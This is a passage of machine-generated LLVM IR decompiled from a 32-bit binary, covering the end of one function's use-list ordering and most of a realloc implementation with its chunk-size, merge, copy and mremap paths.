  uselistorder i32 %v1_804c372, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_804bfbb, { 1, 2, 0 }
  uselistorder i32 %v0_804bfa4, { 1, 0 }
  uselistorder i32 %v2_804bf8b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 0, 12, 14, 15, 16, 17, 18, 1, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_80561a0.358, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134569588, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8055e80.346, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8055e6c.343 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8055e6c.343 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804c70e, { 1, 0 }
  uselistorder label %dec_label_pc_804c6fd, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804c6f0, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804c6ec, { 1, 0 }
  uselistorder label %dec_label_pc_804c6e2, { 1, 0 }
  uselistorder label %dec_label_pc_804c68d, { 1, 0 }
  uselistorder label %dec_label_pc_804c632, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804c5c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c5bf, { 1, 0 }
  uselistorder label %dec_label_pc_804c5a3, { 1, 0 }
  uselistorder label %dec_label_pc_804c54c, { 1, 0 }
  uselistorder label %dec_label_pc_804c535, { 1, 0 }
  uselistorder label %dec_label_pc_804c51e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c4d5, { 1, 0 }
  uselistorder label %dec_label_pc_804c493, { 1, 0 }
  uselistorder label %dec_label_pc_804c42a, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804c3c9, { 1, 0 }
  uselistorder label %dec_label_pc_804c2dd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c2d5, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c249, { 1, 0 }
  uselistorder label %dec_label_pc_804c24e.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c222, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c1a9, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_804c130, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804c119, { 1, 0 }
  uselistorder label %dec_label_pc_804c087, { 1, 0 }
  uselistorder label %dec_label_pc_804c158.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c054, { 1, 0 }
  uselistorder label %dec_label_pc_804bfd2, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804c71a = load i32, i32* @esi, align 4
  %v0_804c71b = load i32, i32* @ebx, align 4
  %v4_804c71f = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_804c728 = icmp eq i1 %v4_804c71f, false
  br i1 %v1_804c728, label %dec_label_pc_804c73a, label %dec_label_pc_804c72a

dec_label_pc_804c72a:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_804c72e = call i32 @malloc(i32 %arg2)
  store i32 %v1_804c72e, i32* %eax.global-to-local, align 4
  store i32 %v1_804c72e, i32* @ebx, align 4
  br label %dec_label_pc_804ca41

dec_label_pc_804c73a:                             ; preds = %entry
  %v1_804c73a = icmp eq i32 %arg2, 0
  %v1_804c73c = icmp eq i1 %v1_804c73a, false
  br i1 %v1_804c73c, label %dec_label_pc_804c74f, label %dec_label_pc_804c73e

dec_label_pc_804c73e:                             ; preds = %dec_label_pc_804c73a
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_804c745 = call i32 @free(i32 %tmp8)
  store i32 %v1_804c745, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca41

dec_label_pc_804c74f:                             ; preds = %dec_label_pc_804c73a
  %v2_804c75a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c75a, i32* @eax, align 4
  store i32 %v2_804c75a, i32* %stack_var_-60, align 4
  %v2_804c75f = call i32 @__pthread_return_void(i32 %v2_804c75a, i32 134535499)
  store i32 %v2_804c75f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053610.341 to i32), i32* %stack_var_-60, align 4
  %v1_804c76b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053610.341 to i32))
  store i32 %v1_804c76b, i32* %eax.global-to-local, align 4
  %v0_804c773 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_804c773, -32
  br i1 %tmp, label %dec_label_pc_804c78a, label %dec_label_pc_804c778

dec_label_pc_804c778:                             ; preds = %dec_label_pc_804c74f
  %v0_804c778 = load i32, i32* %stack_var_-60, align 4
  %v1_804c778 = call i32 @__errno_location(i32 %v0_804c778)
  store i32 %v1_804c778, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804c77f = inttoptr i32 %v1_804c778 to i32*
  store i32 12, i32* %v1_804c77f, align 4
  br label %dec_label_pc_804ca44

dec_label_pc_804c78a:                             ; preds = %dec_label_pc_804c74f
  %v1_804c78a = add i32 %v0_804c773, 11
  %tmp22 = icmp ult i32 %v1_804c78a, 16
  br i1 %tmp22, label %dec_label_pc_804c7a1, label %dec_label_pc_804c79a

dec_label_pc_804c79a:                             ; preds = %dec_label_pc_804c78a
  %v1_804c79a = and i32 %v1_804c78a, -8
  br label %dec_label_pc_804c7a1

dec_label_pc_804c7a1:                             ; preds = %dec_label_pc_804c78a, %dec_label_pc_804c79a
  %stack_var_-40.0 = phi i32 [ %v1_804c79a, %dec_label_pc_804c79a ], [ 16, %dec_label_pc_804c78a ]
  %storemerge21 = phi i32 [ %v1_804c79a, %dec_label_pc_804c79a ], [ %v1_804c78a, %dec_label_pc_804c78a ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_804c7a5 = add i32 %tmp8, -8
  store i32 %v1_804c7a5, i32* @edi, align 4
  %v1_804c7a8 = add i32 %tmp8, -4
  %v2_804c7a8 = inttoptr i32 %v1_804c7a8 to i32*
  %v3_804c7a8 = load i32, i32* %v2_804c7a8, align 4
  store i32 %v3_804c7a8, i32* @edx, align 4
  %v1_804c7ad = and i32 %v3_804c7a8, -4
  store i32 %v1_804c7ad, i32* %eax.global-to-local, align 4
  %v2_804c7b0 = and i32 %v3_804c7a8, 2
  %v3_804c7b0 = icmp eq i32 %v2_804c7b0, 0
  %v1_804c7b7 = icmp eq i1 %v3_804c7b0, false
  br i1 %v1_804c7b7, label %dec_label_pc_804c951, label %dec_label_pc_804c7bd

dec_label_pc_804c7bd:                             ; preds = %dec_label_pc_804c7a1
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c7ad, i32* @ebx, align 4
  %v7_804c7c3 = icmp ult i32 %v1_804c7ad, %stack_var_-40.0
  %v1_804c7c5 = icmp eq i1 %v7_804c7c3, false
  br i1 %v1_804c7c5, label %dec_label_pc_804c8fc, label %dec_label_pc_804c7cb

dec_label_pc_804c7cb:                             ; preds = %dec_label_pc_804c7bd
  %v2_804c7cb = add i32 %v1_804c7ad, %v1_804c7a5
  store i32 %v2_804c7cb, i32* @esi, align 4
  %v1_804c7ce = load i32, i32* @global_var_8055e6c.343, align 4
  %v12_804c7ce = icmp eq i32 %v2_804c7cb, %v1_804c7ce
  %v1_804c7d4 = icmp eq i1 %v12_804c7ce, false
  %v1_804c80e = add i32 %v2_804c7cb, 4
  %v2_804c80e = inttoptr i32 %v1_804c80e to i32*
  %v3_804c80e = load i32, i32* %v2_804c80e, align 4
  br i1 %v1_804c7d4, label %dec_label_pc_804c80e, label %dec_label_pc_804c7d6

dec_label_pc_804c7d6:                             ; preds = %dec_label_pc_804c7cb
  %v1_804c7db = and i32 %v3_804c80e, -4
  %v2_804c7de = add i32 %v1_804c7db, %v1_804c7ad
  store i32 %v2_804c7de, i32* %ecx.global-to-local, align 4
  %v1_804c7e4 = add i32 %stack_var_-40.0, 16
  store i32 %v1_804c7e4, i32* %eax.global-to-local, align 4
  %v7_804c7e7 = icmp ult i32 %v2_804c7de, %v1_804c7e4
  br i1 %v7_804c7e7, label %dec_label_pc_804c84c, label %dec_label_pc_804c7eb

dec_label_pc_804c7eb:                             ; preds = %dec_label_pc_804c7d6
  %v1_804c7eb = urem i32 %v3_804c7a8, 2
  %v5_804c7ee = or i32 %v1_804c7eb, %stack_var_-40.0
  store i32 %v5_804c7ee, i32* @edx, align 4
  store i32 %v5_804c7ee, i32* %v2_804c7a8, align 4
  %v0_804c7f9 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c7f9 = sub i32 %v0_804c7f9, %stack_var_-40.0
  %v0_804c7fb = load i32, i32* @edi, align 4
  %v2_804c7fb = add i32 %v0_804c7fb, %stack_var_-40.0
  store i32 %v2_804c7fb, i32* %eax.global-to-local, align 4
  %v1_804c7fe = or i32 %v2_804c7f9, 1
  store i32 %v1_804c7fe, i32* %ecx.global-to-local, align 4
  store i32 %v2_804c7fb, i32* @global_var_8055e6c.343, align 4
  %v2_804c806 = add i32 %v2_804c7fb, 4
  %v3_804c806 = inttoptr i32 %v2_804c806 to i32*
  store i32 %v1_804c7fe, i32* %v3_804c806, align 4
  br label %dec_label_pc_804ca2f

dec_label_pc_804c80e:                             ; preds = %dec_label_pc_804c7cb
  %v1_804c813 = and i32 %v3_804c80e, -2
  store i32 %v1_804c813, i32* %eax.global-to-local, align 4
  %v3_804c816 = add i32 %v1_804c80e, %v1_804c813
  %v4_804c816 = inttoptr i32 %v3_804c816 to i8*
  %v5_804c816 = load i8, i8* %v4_804c816, align 1
  %v6_804c816 = urem i8 %v5_804c816, 2
  %v7_804c816 = icmp eq i8 %v6_804c816, 0
  %v1_804c81b = icmp eq i1 %v7_804c816, false
  br i1 %v1_804c81b, label %dec_label_pc_804c84c, label %dec_label_pc_804c81d

dec_label_pc_804c81d:                             ; preds = %dec_label_pc_804c80e
  %v1_804c821 = and i32 %v3_804c80e, -4
  %v2_804c824 = add i32 %v1_804c821, %v1_804c7ad
  store i32 %v2_804c824, i32* @ebx, align 4
  %v10_804c826 = icmp ult i32 %v2_804c824, %stack_var_-40.0
  br i1 %v10_804c826, label %dec_label_pc_804c84c, label %dec_label_pc_804c82c

dec_label_pc_804c82c:                             ; preds = %dec_label_pc_804c81d
  %v1_804c82c = add i32 %v1_804c7ad, %tmp8
  %v2_804c82c = inttoptr i32 %v1_804c82c to i32*
  %v3_804c82c = load i32, i32* %v2_804c82c, align 4
  store i32 %v3_804c82c, i32* @edx, align 4
  %v1_804c82f = add i32 %v2_804c7cb, 12
  %v2_804c82f = inttoptr i32 %v1_804c82f to i32*
  %v3_804c82f = load i32, i32* %v2_804c82f, align 4
  store i32 %v3_804c82f, i32* %eax.global-to-local, align 4
  %v1_804c832 = add i32 %v3_804c82c, 12
  %v2_804c832 = inttoptr i32 %v1_804c832 to i32*
  %v3_804c832 = load i32, i32* %v2_804c832, align 4
  %v15_804c832 = icmp eq i32 %v3_804c832, %v2_804c7cb
  %v1_804c835 = icmp eq i1 %v15_804c832, false
  br i1 %v1_804c835, label %dec_label_pc_804c83c, label %dec_label_pc_804c837

dec_label_pc_804c837:                             ; preds = %dec_label_pc_804c82c
  %v1_804c837 = add i32 %v3_804c82f, 8
  %v2_804c837 = inttoptr i32 %v1_804c837 to i32*
  %v3_804c837 = load i32, i32* %v2_804c837, align 4
  %v15_804c837 = icmp eq i32 %v3_804c837, %v2_804c7cb
  br i1 %v15_804c837, label %dec_label_pc_804c841, label %dec_label_pc_804c83c

dec_label_pc_804c83c:                             ; preds = %dec_label_pc_804c837, %dec_label_pc_804c82c
  %v0_804c83c = call i32 @abort()
  store i32 %v0_804c83c, i32* %eax.global-to-local, align 4
  %v1_804c841.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c841

dec_label_pc_804c841:                             ; preds = %dec_label_pc_804c837, %dec_label_pc_804c83c
  %v1_804c841 = phi i32 [ %v3_804c82c, %dec_label_pc_804c837 ], [ %v1_804c841.pre, %dec_label_pc_804c83c ]
  %v0_804c841 = phi i32 [ %v3_804c82f, %dec_label_pc_804c837 ], [ %v0_804c83c, %dec_label_pc_804c83c ]
  %v2_804c841 = add i32 %v1_804c841, 12
  %v3_804c841 = inttoptr i32 %v2_804c841 to i32*
  store i32 %v0_804c841, i32* %v3_804c841, align 4
  %v0_804c844 = load i32, i32* @edx, align 4
  %v1_804c844 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c844 = add i32 %v1_804c844, 8
  %v3_804c844 = inttoptr i32 %v2_804c844 to i32*
  store i32 %v0_804c844, i32* %v3_804c844, align 4
  %v0_804c8fc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c8fc

dec_label_pc_804c84c:                             ; preds = %dec_label_pc_804c81d, %dec_label_pc_804c80e, %dec_label_pc_804c7d6
  %v1_804c853 = add i32 %stack_var_-40.0, -7
  store i32 %v1_804c853, i32* %eax.global-to-local, align 4
  store i32 %v1_804c853, i32* %stack_var_-60, align 4
  %v1_804c857 = call i32 @malloc(i32 %v1_804c853)
  store i32 %v1_804c857, i32* %eax.global-to-local, align 4
  %v1_804c85f = icmp eq i32 %v1_804c857, 0
  store i32 %v1_804c857, i32* @edx, align 4
  br i1 %v1_804c85f, label %dec_label_pc_804ca2b, label %dec_label_pc_804c869

dec_label_pc_804c869:                             ; preds = %dec_label_pc_804c84c
  %v1_804c869 = add i32 %v1_804c857, -8
  store i32 %v1_804c869, i32* %ebx.global-to-local, align 4
  %v1_804c86c = load i32, i32* @esi, align 4
  %v12_804c86c = icmp eq i32 %v1_804c869, %v1_804c86c
  %v1_804c86e = add i32 %v1_804c857, -4
  %v2_804c86e = inttoptr i32 %v1_804c86e to i32*
  %v3_804c86e = load i32, i32* %v2_804c86e, align 4
  store i32 %v3_804c86e, i32* %eax.global-to-local, align 4
  %v1_804c871 = icmp eq i1 %v12_804c86c, false
  br i1 %v1_804c871, label %dec_label_pc_804c87f, label %dec_label_pc_804c873

dec_label_pc_804c873:                             ; preds = %dec_label_pc_804c869
  store i32 %v1_804c7ad, i32* @edx, align 4
  %v1_804c877 = and i32 %v3_804c86e, -4
  store i32 %v1_804c877, i32* %eax.global-to-local, align 4
  %v2_804c87a = add i32 %v1_804c877, %v1_804c7ad
  store i32 %v2_804c87a, i32* @ebx, align 4
  br label %dec_label_pc_804c8fc

dec_label_pc_804c87f:                             ; preds = %dec_label_pc_804c869
  %v1_804c883 = add i32 %v1_804c7ad, -4
  store i32 %v1_804c883, i32* %eax.global-to-local, align 4
  %v2_804c888 = udiv i32 %v1_804c883, 4
  store i32 %v2_804c888, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_804c883, 37
  br i1 %tmp23, label %dec_label_pc_804c8a1, label %dec_label_pc_804c890

dec_label_pc_804c890:                             ; preds = %dec_label_pc_804c87f
  store i32 %v1_804c857, i32* %stack_var_-60, align 4
  %v3_804c897 = inttoptr i32 %v1_804c857 to i16*
  %v4_804c897 = call i32 @memcpy(i16* %v3_804c897, i32 %tmp8, i32 %v1_804c883)
  store i32 %v4_804c897, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c8e8

dec_label_pc_804c8a1:                             ; preds = %dec_label_pc_804c87f
  store i32 %tmp8, i32* @esi, align 4
  %v2_804c8a8 = load i32, i32* %arg1, align 4
  store i32 %v2_804c8a8, i32* %eax.global-to-local, align 4
  %v2_804c8aa = inttoptr i32 %v1_804c857 to i32*
  store i32 %v2_804c8a8, i32* %v2_804c8aa, align 4
  %v0_804c8ac = load i32, i32* @esi, align 4
  %v1_804c8ac = add i32 %v0_804c8ac, 4
  %v2_804c8ac = inttoptr i32 %v1_804c8ac to i32*
  %v3_804c8ac = load i32, i32* %v2_804c8ac, align 4
  store i32 %v3_804c8ac, i32* %eax.global-to-local, align 4
  %v1_804c8af = load i32, i32* @edx, align 4
  %v2_804c8af = add i32 %v1_804c8af, 4
  %v3_804c8af = inttoptr i32 %v2_804c8af to i32*
  store i32 %v3_804c8ac, i32* %v3_804c8af, align 4
  %v0_804c8b2 = load i32, i32* @esi, align 4
  %v1_804c8b2 = add i32 %v0_804c8b2, 8
  %v2_804c8b2 = inttoptr i32 %v1_804c8b2 to i32*
  %v3_804c8b2 = load i32, i32* %v2_804c8b2, align 4
  store i32 %v3_804c8b2, i32* %eax.global-to-local, align 4
  %v1_804c8b5 = load i32, i32* @edx, align 4
  %v2_804c8b5 = add i32 %v1_804c8b5, 8
  %v3_804c8b5 = inttoptr i32 %v2_804c8b5 to i32*
  store i32 %v3_804c8b2, i32* %v3_804c8b5, align 4
  %tmp24 = icmp ult i32 %v1_804c883, 17
  br i1 %tmp24, label %dec_label_pc_804c8e8, label %dec_label_pc_804c8ba

dec_label_pc_804c8ba:                             ; preds = %dec_label_pc_804c8a1
  %v0_804c8ba = load i32, i32* @esi, align 4
  %v1_804c8ba = add i32 %v0_804c8ba, 12
  %v2_804c8ba = inttoptr i32 %v1_804c8ba to i32*
  %v3_804c8ba = load i32, i32* %v2_804c8ba, align 4
  store i32 %v3_804c8ba, i32* %eax.global-to-local, align 4
  %v0_804c8bd = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c8c0 = load i32, i32* @edx, align 4
  %v2_804c8c0 = add i32 %v1_804c8c0, 12
  %v3_804c8c0 = inttoptr i32 %v2_804c8c0 to i32*
  store i32 %v3_804c8ba, i32* %v3_804c8c0, align 4
  %v0_804c8c3 = load i32, i32* @esi, align 4
  %v1_804c8c3 = add i32 %v0_804c8c3, 16
  %v2_804c8c3 = inttoptr i32 %v1_804c8c3 to i32*
  %v3_804c8c3 = load i32, i32* %v2_804c8c3, align 4
  store i32 %v3_804c8c3, i32* %eax.global-to-local, align 4
  %v1_804c8c6 = load i32, i32* @edx, align 4
  %v2_804c8c6 = add i32 %v1_804c8c6, 16
  %v3_804c8c6 = inttoptr i32 %v2_804c8c6 to i32*
  store i32 %v3_804c8c3, i32* %v3_804c8c6, align 4
  %tmp25 = icmp ult i32 %v0_804c8bd, 7
  br i1 %tmp25, label %dec_label_pc_804c8e8, label %dec_label_pc_804c8cb

dec_label_pc_804c8cb:                             ; preds = %dec_label_pc_804c8ba
  %v0_804c8cb = load i32, i32* @esi, align 4
  %v1_804c8cb = add i32 %v0_804c8cb, 20
  %v2_804c8cb = inttoptr i32 %v1_804c8cb to i32*
  %v3_804c8cb = load i32, i32* %v2_804c8cb, align 4
  store i32 %v3_804c8cb, i32* %eax.global-to-local, align 4
  %v0_804c8ce = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c8d1 = load i32, i32* @edx, align 4
  %v2_804c8d1 = add i32 %v1_804c8d1, 20
  %v3_804c8d1 = inttoptr i32 %v2_804c8d1 to i32*
  store i32 %v3_804c8cb, i32* %v3_804c8d1, align 4
  %v0_804c8d4 = load i32, i32* @esi, align 4
  %v1_804c8d4 = add i32 %v0_804c8d4, 24
  %v2_804c8d4 = inttoptr i32 %v1_804c8d4 to i32*
  %v3_804c8d4 = load i32, i32* %v2_804c8d4, align 4
  store i32 %v3_804c8d4, i32* %eax.global-to-local, align 4
  %v1_804c8d7 = load i32, i32* @edx, align 4
  %v2_804c8d7 = add i32 %v1_804c8d7, 24
  %v3_804c8d7 = inttoptr i32 %v2_804c8d7 to i32*
  store i32 %v3_804c8d4, i32* %v3_804c8d7, align 4
  %tmp26 = icmp ult i32 %v0_804c8ce, 9
  br i1 %tmp26, label %dec_label_pc_804c8e8, label %dec_label_pc_804c8dc

dec_label_pc_804c8dc:                             ; preds = %dec_label_pc_804c8cb
  %v0_804c8dc = load i32, i32* @esi, align 4
  %v1_804c8dc = add i32 %v0_804c8dc, 28
  %v2_804c8dc = inttoptr i32 %v1_804c8dc to i32*
  %v3_804c8dc = load i32, i32* %v2_804c8dc, align 4
  store i32 %v3_804c8dc, i32* %eax.global-to-local, align 4
  %v1_804c8df = load i32, i32* @edx, align 4
  %v2_804c8df = add i32 %v1_804c8df, 28
  %v3_804c8df = inttoptr i32 %v2_804c8df to i32*
  store i32 %v3_804c8dc, i32* %v3_804c8df, align 4
  %v0_804c8e2 = load i32, i32* @esi, align 4
  %v1_804c8e2 = add i32 %v0_804c8e2, 32
  %v2_804c8e2 = inttoptr i32 %v1_804c8e2 to i32*
  %v3_804c8e2 = load i32, i32* %v2_804c8e2, align 4
  store i32 %v3_804c8e2, i32* %eax.global-to-local, align 4
  %v1_804c8e5 = load i32, i32* @edx, align 4
  %v2_804c8e5 = add i32 %v1_804c8e5, 32
  %v3_804c8e5 = inttoptr i32 %v2_804c8e5 to i32*
  store i32 %v3_804c8e2, i32* %v3_804c8e5, align 4
  br label %dec_label_pc_804c8e8

dec_label_pc_804c8e8:                             ; preds = %dec_label_pc_804c8cb, %dec_label_pc_804c8ba, %dec_label_pc_804c8a1, %dec_label_pc_804c890, %dec_label_pc_804c8dc
  %v0_804c8eb = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c8eb = add i32 %v0_804c8eb, 8
  store i32 %v1_804c8eb, i32* @ebx, align 4
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_804c8f2 = call i32 @free(i32 %tmp8)
  br label %dec_label_pc_804ca26

dec_label_pc_804c8fc:                             ; preds = %dec_label_pc_804c7bd, %dec_label_pc_804c873, %dec_label_pc_804c841
  %v1_804c90d = phi i32 [ %v1_804c7ad, %dec_label_pc_804c7bd ], [ %v2_804c87a, %dec_label_pc_804c873 ], [ %v0_804c8fc.pre, %dec_label_pc_804c841 ]
  %v5_804c8fe = sub i32 %v1_804c90d, %stack_var_-40.0
  store i32 %v5_804c8fe, i32* %ecx.global-to-local, align 4
  %tmp27 = icmp ult i32 %v5_804c8fe, 16
  br i1 %tmp27, label %dec_label_pc_804c907, label %dec_label_pc_804c919

dec_label_pc_804c907:                             ; preds = %dec_label_pc_804c8fc
  %v0_804c907 = load i32, i32* @edi, align 4
  %v1_804c907 = add i32 %v0_804c907, 4
  %v2_804c907 = inttoptr i32 %v1_804c907 to i32*
  %v3_804c907 = load i32, i32* %v2_804c907, align 4
  %v1_804c90a = urem i32 %v3_804c907, 2
  %v2_804c90d = or i32 %v1_804c90a, %v1_804c90d
  store i32 %v2_804c90d, i32* %eax.global-to-local, align 4
  store i32 %v2_804c90d, i32* %v2_804c907, align 4
  %v0_804c912 = load i32, i32* @edi, align 4
  %v1_804c912 = load i32, i32* @ebx, align 4
  %v2_804c912 = add i32 %v0_804c912, 4
  %v3_804c912 = add i32 %v2_804c912, %v1_804c912
  %v4_804c912 = inttoptr i32 %v3_804c912 to i32*
  %v5_804c912 = load i32, i32* %v4_804c912, align 4
  %v6_804c912 = or i32 %v5_804c912, 1
  store i32 %v6_804c912, i32* %v4_804c912, align 4
  br label %dec_label_pc_804c949

dec_label_pc_804c919:                             ; preds = %dec_label_pc_804c8fc
  %v0_804c91d = load i32, i32* @edi, align 4
  %v2_804c91d = add i32 %v0_804c91d, %stack_var_-40.0
  store i32 %v2_804c91d, i32* %eax.global-to-local, align 4
  %v1_804c920 = add i32 %v0_804c91d, 4
  %v2_804c920 = inttoptr i32 %v1_804c920 to i32*
  %v3_804c920 = load i32, i32* %v2_804c920, align 4
  %v1_804c923 = urem i32 %v3_804c920, 2
  %v5_804c926 = or i32 %v1_804c923, %stack_var_-40.0
  store i32 %v5_804c926, i32* %v2_804c920, align 4
  %v0_804c930 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c932 = or i32 %v0_804c930, 1
  store i32 %v1_804c932, i32* @edx, align 4
  %v1_804c935 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c935 = add i32 %v1_804c935, 4
  %v3_804c935 = inttoptr i32 %v2_804c935 to i32*
  store i32 %v1_804c932, i32* %v3_804c935, align 4
  %v0_804c938 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c938 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c938 = add i32 %v0_804c938, 4
  %v3_804c938 = add i32 %v2_804c938, %v1_804c938
  %v4_804c938 = inttoptr i32 %v3_804c938 to i32*
  %v5_804c938 = load i32, i32* %v4_804c938, align 4
  %v6_804c938 = or i32 %v5_804c938, 1
  store i32 %v6_804c938, i32* %v4_804c938, align 4
  %v0_804c93d = load i32, i32* %eax.global-to-local, align 4
  %v1_804c93d = add i32 %v0_804c93d, 8
  store i32 %v1_804c93d, i32* %eax.global-to-local, align 4
  store i32 %v1_804c93d, i32* %stack_var_-60, align 4
  %v1_804c941 = call i32 @free(i32 %v1_804c93d)
  store i32 %v1_804c941, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c949

dec_label_pc_804c949:                             ; preds = %dec_label_pc_804c907, %dec_label_pc_804c919
  %v0_804c949 = load i32, i32* @edi, align 4
  %v1_804c949 = add i32 %v0_804c949, 8
  store i32 %v1_804c949, i32* @ebx, align 4
  br label %dec_label_pc_804ca33

dec_label_pc_804c951:                             ; preds = %dec_label_pc_804c7a1
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  %v0_804c955 = load i32, i32* @global_var_805619c.348, align 4
  store i32 %v0_804c955, i32* %eax.global-to-local, align 4
  %v2_804c95e = inttoptr i32 %v1_804c7a5 to i32*
  %v3_804c95e = load i32, i32* %v2_804c95e, align 4
  store i32 %v3_804c95e, i32* @ebp, align 4
  %v1_804c961 = add i32 %v0_804c955, -1
  %v1_804c962 = or i32 %stack_var_-40.0, 4
  store i32 %v1_804c962, i32* %stack_var_-44, align 4
  %v2_804c968 = add i32 %v1_804c961, %v3_804c95e
  store i32 %v2_804c968, i32* @edx, align 4
  %v1_804c96b = sub i32 0, %v0_804c955
  store i32 %v1_804c96b, i32* %eax.global-to-local, align 4
  %v2_804c96d = add i32 %v2_804c968, %v1_804c962
  %v2_804c970 = and i32 %v2_804c96d, %v1_804c96b
  store i32 %v2_804c970, i32* @esi, align 4
  %v2_804c974 = sub i32 %v2_804c970, %v3_804c95e
  store i32 %v2_804c974, i32* @ebx, align 4
  %v15_804c976 = icmp eq i32 %v1_804c7ad, %v2_804c974
  br i1 %v15_804c976, label %dec_label_pc_804ca2f, label %dec_label_pc_804c980

dec_label_pc_804c980:                             ; preds = %dec_label_pc_804c951
  %v2_804c982 = sub i32 %v1_804c7a5, %v3_804c95e
  store i32 %v2_804c982, i32* @edi, align 4
  %v2_804c989 = add i32 %v3_804c95e, %v1_804c7ad
  store i32 %v2_804c989, i32* %eax.global-to-local, align 4
  store i32 %v2_804c982, i32* %stack_var_-60, align 4
  %v6_804c98d = call i32 @mremap(i32 %v2_804c982, i32 %v2_804c989, i32 %v2_804c970, i32 1, i32 %v1_804c962, i32 %v1_804c7ad)
  store i32 %v6_804c98d, i32* %eax.global-to-local, align 4
  %v10_804c995 = icmp eq i32 %v6_804c98d, -1
  br i1 %v10_804c995, label %dec_label_pc_804c9e7, label %dec_label_pc_804c99a

dec_label_pc_804c99a:                             ; preds = %dec_label_pc_804c980
  %v1_804c99a = load i32, i32* @ebp, align 4
  %v2_804c99a = add i32 %v1_804c99a, %v6_804c98d
  store i32 %v2_804c99a, i32* %eax.global-to-local, align 4
  %v0_804c99c = load i32, i32* @ebx, align 4
  %v1_804c99c = or i32 %v0_804c99c, 2
  %v2_804c99f = add i32 %v2_804c99a, 4
  %v3_804c99f = inttoptr i32 %v2_804c99f to i32*
  store i32 %v1_804c99c, i32* %v3_804c99f, align 4
  %v0_804c9a2 = load i32, i32* @esi, align 4
  %v5_804c9a4 = sub i32 %v0_804c9a2, %v1_804c7ad
  %v0_804c9a8 = load i32, i32* @global_var_80561b0.352, align 16
  %v0_804c9ae = load i32, i32* %eax.global-to-local, align 4
  %v1_804c9ae = add i32 %v0_804c9ae, 8
  store i32 %v1_804c9ae, i32* @ebx, align 4
  %v1_804c9b1 = load i32, i32* @global_var_80561a4.354, align 4
  %v2_804c9b1 = add i32 %v1_804c9b1, %v5_804c9a4
